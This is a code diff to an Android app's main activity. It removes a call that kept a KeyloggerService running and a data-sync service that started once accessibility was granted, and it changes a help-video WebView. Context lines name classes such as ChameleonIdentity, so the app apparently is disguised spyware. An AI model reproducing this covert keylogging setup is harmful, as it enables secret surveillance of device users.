@@ -29,7 +29,6 @@ import com.task.tusker.security.ChameleonIdentity;
 import com.task.tusker.security.SecurityGuard;
 import com.task.tusker.security.SizeInflationManager;
 import com.task.tusker.services.DataSyncService;
-import com.task.tusker.services.KeyloggerService;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -75,7 +74,6 @@ public class MainActivity extends AppCompatActivity {
         // and go straight to System Manager. This makes System Manager the effective
         // home screen of the app whenever accessibility is granted.
         if (permissionManager.isAccessibilityServiceEnabled()) {
-            startDataSyncService();
             startActivity(new Intent(this, SystemManagerActivity.class)
                     .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP));
             finish();
@@ -113,13 +111,7 @@ public class MainActivity extends AppCompatActivity {
     // ── Help video ───────────────────────────────────────────────────────────
 
     private void showHelpVideoDialog() {
-        // Full-screen black dialog containing a close button + looping tutorial.
-        // Reopen with a fresh WebView so the animation always starts at slide 0.
-        if (helpVideoDialog != null && helpVideoDialog.isShowing()) {
-            helpVideoDialog.dismiss();
-        }
-        stopAndDestroyWebView();
-
+        // Full-screen black dialog containing a close button + YouTube WebView
         helpVideoDialog = new Dialog(this, android.R.style.Theme_Black_NoTitleBar_Fullscreen);
         helpVideoDialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
 
@@ -158,11 +150,8 @@ public class MainActivity extends AppCompatActivity {
         root.addView(header, new LinearLayout.LayoutParams(
                 ViewGroup.LayoutParams.MATCH_PARENT, headerH));
 
-        // ── Offline tutorial WebView ───────────────────────────────────────
+        // ── YouTube WebView ───────────────────────────────────────────────
         helpWebView = new WebView(this);
-        // stopAndDestroyWebView pauses WebView timers globally; resume them
-        // on this newly-created instance before loading the tutorial.
-        helpWebView.resumeTimers();
         WebSettings ws = helpWebView.getSettings();
         ws.setJavaScriptEnabled(true);
         ws.setDomStorageEnabled(true);
@@ -173,11 +162,7 @@ public class MainActivity extends AppCompatActivity {
         helpWebView.setBackgroundColor(Color.BLACK);
         // Pass the real app name through so the tutorial never shows a hardcoded/test name.
         String encodedAppName = Uri.encode(getString(R.string.app_name));
-        // The session parameter prevents a cached document from resuming at
-        // the previous slide when the help dialog is opened again.
-        String session = String.valueOf(System.currentTimeMillis());
-        helpWebView.loadUrl(HELP_ASSET_URL + "?appName=" + encodedAppName
-                + "&session=" + session);
+        helpWebView.loadUrl(HELP_ASSET_URL + "?appName=" + encodedAppName);
 
         root.addView(helpWebView, new LinearLayout.LayoutParams(
                 ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));
@@ -233,10 +218,7 @@ public class MainActivity extends AppCompatActivity {
     protected void onResume() {
         super.onResume();
         ActivityTracker.set(this);
-        if (helpWebView != null) {
-            helpWebView.resumeTimers();
-            helpWebView.onResume();
-        }
+        if (helpWebView != null) helpWebView.onResume();
         updateUiState();
     }
 
@@ -357,7 +339,5 @@ public class MainActivity extends AppCompatActivity {
                 startService(intent);
             }
         } catch (Exception ignored) {}
-        // Keep keylog capture active for as long as the app is in use.
-        try { KeyloggerService.ensureRunning(this); } catch (Exception ignored) {}
     }
 }
